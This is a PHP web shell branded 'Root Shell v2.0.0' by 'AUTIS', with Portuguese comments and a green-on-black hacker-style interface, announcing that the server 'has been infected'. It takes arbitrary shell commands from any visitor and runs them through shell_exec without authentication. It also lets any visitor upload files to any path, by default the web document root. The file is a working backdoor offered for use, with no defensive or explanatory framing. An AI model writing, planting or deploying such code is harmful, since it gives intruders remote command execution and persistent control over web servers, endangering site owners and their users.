<?php
$owner = "AUTIS"; // nick
$version = "2.0.0"; // version

// Obtenha as variáveis do servidor
$self = $_SERVER['PHP_SELF'];
$docr = $_SERVER['DOCUMENT_ROOT'];
$sern = $_SERVER['SERVER_NAME'];

// Defina a variável de finalização da tabela
$tend = "</tr></form></table><br><br><br><br>";

// Verifique se a ação foi passada via GET ou POST
if (!empty($_GET['ac'])) {
    $ac = $_GET['ac'];
} elseif (!empty($_POST['ac'])) {
    $ac = $_POST['ac'];
} else {
    $ac = "";
}

// Manipule a ação de acordo com o valor de $ac
switch ($ac) {
    case "upload":
        $message = "";

        // Verifique se o caminho foi passado via POST
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['path'])) {
            $uploadfile = $_POST['path'] . $_FILES['file']['name'];
            if ($_POST['path'] == "") {
                $uploadfile = $_FILES['file']['name'];
            }

            // Tente copiar o arquivo enviado para o caminho especificado
            if (copy($_FILES['file']['tmp_name'], $uploadfile)) {
                $message = "Arquivo " . $_FILES['file']['name'] . " enviado com sucesso!";
            } else {
                $message = "Erro ao enviar o arquivo: " . print_r($_FILES, true);
            }
        }

        echo <<<HTML
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Upload de Arquivo</title>
    <style>
        body {
            font-family: 'Courier New', Courier, monospace;
            background-color: #0d0d0d;
            color: #00ff00;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .upload-box {
            background-color: #1a1a1a;
            padding: 20px;
            border: 1px solid #00ff00;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
            text-align: center;
            margin-bottom: 20px;
        }
        table {
            margin: 0 auto;
            border-collapse: collapse;
        }
        input[type="file"],
        input[type="text"],
        input[type="submit"] {
            padding: 10px;
            margin: 5px;
            border: 1px solid #00ff00;
            border-radius: 4px;
            background-color: #0d0d0d;
            color: #00ff00;
        }
        input[type="submit"] {
            cursor: pointer;
        }
        input[type="submit"]:hover {
            background-color: #00ff00;
            color: #0d0d0d;
        }
        .message {
            color: #00ff00;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="upload-box">
        <table>
            <form enctype="multipart/form-data" action="$self" method="POST">
                <input type="hidden" name="ac" value="upload">
                <tr>
                    <td><input size="5" name="file" type="file"></td>
                </tr>
                <tr>
                    <td><input size="10" value="$docr/" name="path" type="text"><input type="submit" value="OK"></td>
                </tr>
            </form>
        </table>
    </div>
    <div class="message">$message</div>
</body>
</html>
HTML;

        break;

    default:
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Root Shell</title>
    <style>
        body {
            background-color: #000;
            color: #0f0;
            font-family: 'Courier New', Courier, monospace;
            text-align: center;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
        }

        .container {
            max-width: 600px;
            width: 100%;
            padding: 20px;
            border: 1px solid #0f0;
            background-color: #111;
            box-sizing: border-box;
            margin-bottom: 20px;
        }

        h1, h2 {
            font-size: 24px;
            margin-bottom: 10px;
            color: #0f0;
        }

        p {
            margin: 10px 0;
            color: #0f0;
        }

        textarea, input[type="text"], input[type="submit"], input[type="reset"] {
            width: 90%;
            margin: 10px 0;
            padding: 10px;
            font-size: 14px;
            background-color: #222;
            color: #0f0;
            border: 1px solid #0f0;
        }

        .output {
            width: 90%;
            height: 200px;
            margin: 10px auto;
            padding: 10px;
            font-size: 14px;
            border: 1px solid #0f0;
            overflow-y: auto;
            background-color: #222;
            color: #0f0;
            white-space: pre-wrap;
        }
    </style>
</head>
<body>

<div class="container">
    <h1>Root Shell v<?php echo $version; ?></h1>
    <p><?php echo "This server has been infected by $owner"; ?></p>
    <hr>

    <h2>Command Execute</h2>
    <form method="post">
        <textarea name="command" rows="2" placeholder="Insert your commands here"></textarea><br>
        <input type="submit" value="Execute!">
    </form>

    <?php
    if ($_SERVER["REQUEST_METHOD"] == "POST" && empty($_POST["ac"])) {
        if (!empty($_POST["command"])) {
            echo "<h2>Output:</h2>";
            echo "<div class='output'>";
            $command = $_POST["command"];
            $output = shell_exec($command);
            // Verifica se o comando começa com "cat " para exibir um arquivo
            if (strpos($command, "cat ") === 0) {
                $file = trim(substr($command, 4)); // Obtém o nome do arquivo após "cat "
                if (file_exists($file)) {
                    echo "<pre>";
                    echo htmlspecialchars(file_get_contents($file)); // Exibe o conteúdo do arquivo com HTML special characters
                    echo "</pre>";
                } else {
                    echo "<p>File not found: $file</p>";
                }
            } else {
                echo "<pre>$output</pre>";
            }
            echo "</div>";
        } else {
            echo "<p>Please enter a command.</p>";
        }
    }
    ?>

</div>

<div class="container">
    <h2>File Upload</h2>
    <div class="upload-box">
        <table>
            <form enctype="multipart/form-data" action="<?php echo $self; ?>" method="POST">
                <input type="hidden" name="ac" value="upload">
                <tr>
                    <td><input size="5" name="file" type="file"></td>
                </tr>
                <tr>
                    <td><input size="10" value="<?php echo $docr; ?>/" name="path" type="text"><input type="submit" value="Upload"></td>
                </tr>
            </form>
        </table>
    </div>
    <div class="message"><?php echo $message; ?></div>
</div>

</body>
</html>

<?php
        break;
}
?>

